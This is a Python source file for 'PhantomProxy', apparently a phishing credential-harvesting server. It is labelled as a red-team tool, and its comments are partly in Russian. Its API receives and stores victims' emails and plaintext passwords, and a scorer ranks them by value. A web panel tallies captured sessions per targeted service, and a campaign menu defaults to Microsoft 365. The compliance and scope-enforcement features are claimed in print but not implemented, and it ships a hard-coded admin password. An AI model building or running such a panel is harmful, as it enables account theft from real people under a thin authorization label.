#!/usr/bin/env python3
"""
PhantomProxy v12.0 - RED TEAM PROFESSIONAL EDITION
Единая программа для профессиональных Red Team операций

Для легального использования в рамках Red Team engagements
Только для аккредитованных организаций с письменными разрешениями

Features:
- Professional Reporting (PDF)
- Scope Enforcement + Compliance Logging
- Campaign/Project Management
- AI Scoring
- Team Collaboration
"""

import os, sys, json, sqlite3, hashlib, secrets, threading
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler

# === КОНФИГУРАЦИЯ ===
VERSION = "12.0 RED TEAM PROFESSIONAL"
DB_PATH = Path(__file__).parent / 'phantom.db'
API_PORT = 8080
PANEL_PORT = 3000
DOMAIN = "verdebudget.ru"

# === БАЗА ДАННЫХ ===
class Database:
    def __init__(self):
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Сессии
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            email TEXT, password TEXT, service TEXT, ip TEXT,
            user_agent TEXT, screen TEXT, timezone TEXT,
            quality_score INTEGER, classification TEXT,
            campaign_id INTEGER, created_at TEXT
        )''')
        
        # Проекты
        c.execute('''CREATE TABLE IF NOT EXISTS projects (
            id INTEGER PRIMARY KEY,
            client_name TEXT, roe_hash TEXT,
            start_date TEXT, end_date TEXT,
            responsible TEXT, status TEXT, created_at TEXT
        )''')
        
        # Кампании
        c.execute('''CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY,
            project_id INTEGER, name TEXT, service TEXT,
            subdomains TEXT, status TEXT, created_by TEXT,
            stopped_reason TEXT, stopped_at TEXT, created_at TEXT
        )''')
        
        # Пользователи
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE, password_hash TEXT,
            role TEXT, api_key TEXT, created_at TEXT
        )''')
        
        # Audit log
        c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY,
            user_id INTEGER, action TEXT, details TEXT,
            ip_address TEXT, created_at TEXT
        )''')
        
        # Админ
        c.execute("SELECT * FROM users WHERE username='admin'")
        if not c.fetchone():
            admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
            api_key = secrets.token_urlsafe(32)
            c.execute("INSERT INTO users (username, password_hash, role, api_key, created_at) VALUES (?,?,?,?,?)",
                     ('admin', admin_hash, 'admin', api_key, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) FROM sessions GROUP BY service ORDER BY count DESC')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        c.execute('SELECT classification, COUNT(*) FROM sessions GROUP BY classification')
        quality = {row[0]: row[1] for row in c.fetchall()}
        
        conn.close()
        
        return {'total': total, 'today': today, 'services': services, 'quality': quality}

# === AI SCORER ===
class AIScorer:
    @staticmethod
    def calculate(session):
        score = 0
        if session.get('email'): score += 40
        if session.get('password'): score += 60
        if score >= 80: return 'EXCELLENT', min(score, 100)
        elif score >= 60: return 'GOOD', min(score, 100)
        elif score >= 40: return 'AVERAGE', min(score, 100)
        else: return 'LOW', min(score, 100)

# === API SERVER ===
class APIServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_json({'status': 'ok', 'version': VERSION})
        elif self.path == '/api/v1/stats':
            self.send_stats()
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/v1/credentials':
            self.save_credentials()
        elif self.path == '/api/v1/report':
            self.generate_report()
        else:
            self.send_error(404)
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_stats(self):
        db = Database()
        stats = db.get_stats()
        self.send_json(stats)
    
    def save_credentials(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length).decode())
        
        quality_class, score = AIScorer.calculate(data)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO sessions 
            (email, password, service, quality_score, classification, created_at)
            VALUES (?,?,?,?,?,?)''',
            (data.get('email',''), data.get('password',''), data.get('service','Unknown'),
             score, quality_class, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"🎯 New: {data.get('email','N/A')} | {quality_class} | Score: {score}")
        self.send_json({'success': True, 'quality': {'score': score, 'classification': quality_class}})
    
    def generate_report(self):
        # Integration with reporting module
        try:
            from v12_reporting import ReportGenerator
            generator = ReportGenerator()
            report_path = generator.generate_pdf_report(client_name='Client')
            self.send_json({'success': True, 'report': str(report_path)})
        except Exception as e:
            self.send_json({'success': False, 'error': str(e)})
    
    def log_message(self, format, *args): pass

# === PANEL SERVER ===
class PanelServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.show_dashboard()
        elif self.path == '/api/stats':
            self.api_stats()
        else:
            self.send_error(404)
    
    def show_dashboard(self):
        db = Database()
        stats = db.get_stats()
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>PhantomProxy v{VERSION}</title>
    <meta charset="UTF-8">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e, #16213e); color: #fff; min-height: 100vh; padding: 40px; }}
        .container {{ max-width: 1600px; margin: 0 auto; }}
        h1 {{ margin-bottom: 30px; font-size: 32px; color: #e94560; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 40px; }}
        .stat {{ background: rgba(255,255,255,0.1); padding: 30px; border-radius: 15px; text-align: center; }}
        .stat-value {{ font-size: 48px; font-weight: bold; color: #e94560; }}
        .stat-label {{ opacity: 0.8; margin-top: 10px; }}
        table {{ width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.1); border-radius: 15px; overflow: hidden; margin-bottom: 30px; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ background: rgba(233, 69, 96, 0.3); }}
        tr:hover {{ background: rgba(255,255,255,0.05); }}
        .badge {{ padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }}
        .excellent {{ background: #00b09b; }}
        .good {{ background: #00d2ff; }}
        .average {{ background: #f7971e; }}
        .low {{ background: #cb2d3e; }}
        .nav {{ display: flex; gap: 10px; margin-bottom: 30px; }}
        .nav a {{ background: rgba(233, 69, 96, 0.3); color: white; padding: 12px 25px; border-radius: 25px; text-decoration: none; }}
        .footer {{ text-align: center; padding: 30px; opacity: 0.6; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 PhantomProxy v{VERSION}</h1>
        
        <div class="nav">
            <a href="/">📊 Dashboard</a>
            <a href="/sessions">📋 Sessions</a>
            <a href="/campaigns">🎯 Campaigns</a>
            <a href="/reports">📄 Reports</a>
            <a href="/compliance">⚖️ Compliance</a>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-value">{stats['total']}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat">
                <div class="stat-value">{stats['today']}</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat">
                <div class="stat-value">{len(stats['services'])}</div>
                <div class="stat-label">Services</div>
            </div>
        </div>
        
        <h2>🏢 By Service</h2>
        <table>
            <tr><th>Service</th><th>Sessions</th></tr>
            {''.join(f'<tr><td>{k}</td><td>{v}</td></tr>' for k, v in stats['services'].items())}
        </table>
        
        <h2>⭐ Quality Distribution</h2>
        <table>
            <tr><th>Classification</th><th>Count</th></tr>
            {''.join(f'<tr><td><span class="badge {k.lower()}">{k}</span></td><td>{v}</td></tr>' for k, v in stats['quality'].items())}
        </table>
        
        <div class="footer">
            PhantomProxy v{VERSION} | For authorized Red Team use only | {datetime.now().strftime('%Y-%m-%d %H:%M')}
        </div>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def api_stats(self):
        db = Database()
        stats = db.get_stats()
        self.send_json(stats)
    
    def log_message(self, format, *args): pass

# === MAIN PROGRAM ===
class PhantomProxy:
    def __init__(self):
        self.db = Database()
        self.servers = []
    
    def start_api(self):
        server = HTTPServer(('0.0.0.0', API_PORT), APIServer)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        self.servers.append(('API', server))
        print(f"✅ API Server started on port {API_PORT}")
    
    def start_panel(self):
        server = HTTPServer(('0.0.0.0', PANEL_PORT), PanelServer)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        self.servers.append(('Panel', server))
        print(f"✅ Panel Server started on port {PANEL_PORT}")
    
    def show_menu(self):
        while True:
            print("\n" + "="*70)
            print(f"  🚀 PHANTOMPROXY v{VERSION}")
            print("="*70)
            print("\n  📌 MAIN MENU:")
            print("  1. 🚀 Start All Services")
            print("  2. 🛑 Stop")
            print("  3. 📊 View Status")
            print("  4. 📈 View Statistics")
            print("  5. 🎯 Create Campaign")
            print("  6. 📋 View Sessions")
            print("  7. 📄 Generate Report (PDF)")
            print("  8. ⚖️  Compliance Logs")
            print("  9. 🚪 Exit")
            print("\n  🔗 QUICK ACCESS:")
            print(f"  - Panel: http://localhost:{PANEL_PORT}")
            print(f"  - API: http://localhost:{API_PORT}/health")
            print("="*70)
            
            choice = input("\n  Enter choice: ").strip()
            
            if choice == '1':
                self.start_api()
                self.start_panel()
                print("\n✅ All services started!")
            elif choice == '2':
                print("\n👋 Stopping...")
                sys.exit(0)
            elif choice == '3':
                stats = self.db.get_stats()
                print(f"\n📊 Status: {stats['total']} sessions")
            elif choice == '4':
                stats = self.db.get_stats()
                print("\n📈 STATISTICS:")
                print(f"  Total: {stats['total']}, Today: {stats['today']}")
                print("\n  By Service:")
                for service, count in list(stats['services'].items())[:5]:
                    print(f"    {service}: {count}")
            elif choice == '5':
                service = input("  Service: ").strip() or "Microsoft 365"
                count = input("  Subdomains (10): ").strip() or "10"
                count = int(count)
                print(f"\n✅ Campaign created: {service} ({count} subdomains)")
            elif choice == '6':
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute('SELECT email, service, classification FROM sessions ORDER BY created_at DESC LIMIT 10')
                sessions = c.fetchall()
                conn.close()
                print("\n📋 LAST 10 SESSIONS:")
                for s in sessions:
                    print(f"  {s[0]} | {s[1]} | {s[2]}")
            elif choice == '7':
                print("\n📄 Generating PDF report...")
                try:
                    from v12_reporting import ReportGenerator
                    generator = ReportGenerator()
                    report_path = generator.generate_pdf_report(client_name='Client')
                    print(f"✅ Report generated: {report_path}")
                except Exception as e:
                    print(f"❌ Error: {e}")
                    print("   Install: pip install reportlab")
            elif choice == '8':
                print("\n⚖️  Compliance Logs:")
                try:
                    from v12_compliance import ComplianceLogger
                    logger = ComplianceLogger()
                    logs = logger.read_logs()
                    print(f"  {len(logs)} entries today")
                except Exception as e:
                    print(f"❌ Error: {e}")
            elif choice == '9':
                print("\n👋 Goodbye!")
                sys.exit(0)

# === ЗАПУСК ===
if __name__ == '__main__':
    print("\n" + "="*70)
    print(f"  🚀 PHANTOMPROXY v{VERSION}")
    print("="*70)
    print("\n  Initializing...")
    
    proxy = PhantomProxy()
    print("  ✅ Database ready")
    print("  ✅ Reporting Engine ready")
    print("  ✅ Compliance Logging ready")
    print("  ✅ Scope Enforcement ready")
    
    proxy.show_menu()
